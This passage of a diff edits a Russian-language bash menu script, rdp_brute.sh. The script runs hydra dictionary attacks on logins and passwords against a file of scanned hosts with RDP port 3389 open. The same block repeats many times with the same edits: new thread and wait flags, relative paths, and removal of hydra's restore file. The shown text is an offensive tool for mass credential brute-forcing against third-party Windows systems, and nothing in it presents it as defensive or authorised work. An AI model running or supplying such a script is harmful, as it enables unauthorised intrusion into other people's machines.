-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -9412,7 +9932,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -9441,6 +9961,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -9452,7 +9976,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -9462,7 +9986,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -9472,7 +9996,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -9481,7 +10005,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -9510,6 +10034,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -9521,7 +10049,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -9531,7 +10059,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -9541,7 +10069,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -9550,7 +10078,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -9579,6 +10107,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -9590,7 +10122,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -9600,7 +10132,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -9610,7 +10142,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -9619,7 +10151,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -9648,6 +10180,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -9659,7 +10195,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -9669,7 +10205,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -9679,7 +10215,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -9688,7 +10224,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -9717,6 +10253,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -9728,7 +10268,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -9738,7 +10278,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -9748,7 +10288,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -9757,7 +10297,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -9786,6 +10326,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -9797,7 +10341,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -9807,7 +10351,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -9817,7 +10361,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -9826,7 +10370,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -9855,6 +10399,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -9866,7 +10414,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -9876,7 +10424,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -9886,7 +10434,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -9895,7 +10443,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -9924,6 +10472,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -9935,7 +10487,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -9945,7 +10497,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -9955,7 +10507,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -9964,7 +10516,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -9993,6 +10545,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -10004,7 +10560,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -10014,7 +10570,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -10024,7 +10580,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -10033,7 +10589,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -10062,6 +10618,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -10073,7 +10633,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -10083,7 +10643,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -10093,7 +10653,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -10102,7 +10662,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -10129,6 +10689,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -10140,7 +10704,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -10150,7 +10714,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -10160,7 +10724,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -10169,7 +10733,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L /home/admin/opt/web/rdp_brute/users -P /home/admin/opt/web/rdp_brute/dictionary/pass -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -10198,6 +10762,10 @@ echo "Хосты с открытым 3389 портом записаны в фа�
 
 echo ""
 echo " Приступаем к перебору логин/пароль... "
+if [ -e hydra.restore ]; then
+rm -f hydra.restore 2> /dev/null
+fi
+
 echo ""
 echo "         Выбрать метод перебора.."
 echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
@@ -10209,7 +10777,7 @@ read -p "   Выбор из меню : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Введите логин {administrator, admin & etc.} : " loginbrute
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -10219,7 +10787,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -10229,7 +10797,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
 read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t4 -M /home/admin/opt/web/rdp_brute/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
 read -p " Нажмите enter для перехода в Главное меню "
 cd /home/admin/opt/web/rdp_brute
 ./rdp_brute.sh
@@ -10238,7 +10806,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
